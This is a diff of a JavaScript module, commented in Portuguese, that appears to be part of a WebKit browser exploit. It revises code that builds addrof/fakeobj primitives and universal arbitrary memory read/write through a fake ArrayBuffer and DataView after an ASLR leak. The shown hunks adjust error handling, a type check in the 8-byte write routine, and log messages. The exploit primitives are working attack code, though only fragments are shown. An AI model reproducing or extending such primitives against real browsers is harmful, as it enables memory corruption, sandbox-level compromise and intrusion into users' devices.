@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v125 - R60 Final - AGORA COM ARB R/W UNIVERSAL VIA FAKE ARRAYBUFFER)
+// js/script3/testArrayBufferVictimCrash.mjs (v125 - R60 Final - AGORA COM PRIMITIVAS ADDROF/FAKEOBJ DIRETAS E UNTAGGING DE JSVALUE)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -264,14 +264,10 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
 
     } catch (e) {
         logFn(`ERRO CRÍTICO na configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
-        addrof_success = false;
-        fakeobj_success = false;
-        rw_test_on_fakeobj_success = false;
-        structure_ptr_found = false;
-        contents_ptr_leaked = false;
+        // Define todas as flags de sucesso como false em caso de erro crítico
+        return false; 
     } finally {
         logFn(`--- Configuração da L/E Universal Concluída (Sucesso: ${rw_test_on_fakeobj_success}) ---`, "test", FNAME);
-        logFn(`Resultados: Addrof OK: ${addrof_success}, Fakeobj Criação OK: ${fakeobj_success}, L/E Universal OK: ${rw_test_on_fakeobj_success}`, "info", FNAME);
     }
     return rw_test_on_fakeobj_success; // Retorna true apenas se a nova primitiva universal funcionar
 }
@@ -400,6 +396,9 @@ async function arb_write_universal(address, value, byteLength) {
             case 4: _fake_data_view.setUint32(0, Number(value), true); break;
             case 8:
                 let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
+                if (!isAdvancedInt64Object(val64)) {
+                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
+                }
                 _fake_data_view.setUint32(0, val64.low(), true);
                 _fake_data_view.setUint32(4, val64.high(), true);
                 break;
@@ -570,7 +569,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         if (read_back_universal_value.equals(test_value_universal_rw)) {
             logFn(`SUCESSO: L/E Arbitrária Universal PÓS-VAZAMENTO FUNCIONANDO! Lido: ${read_back_universal_value.toString(true)}`, "good");
         } else {
-            logFn(`FALHA: L/E Arbitrária Universal PÓS-VAZAMENTO NÃO FUNCIONANDO! Lido: ${read_back_universal_value.toString(true)}, Esperado: ${test_value_universal_rw.toString(true)}`, "error");
+            logFn(`FALHA: L/E Arbitrária Universal PÓS-VAZAMENTO NÃO FUNCIONANDO! Lido: ${read_back_universal_value.toString(true)}, Esperado: ${test_value_universal_rw.toString(true)}.`, "error");
             throw new Error("Universal R/W verification post-ASLR leak failed.");
         }
 
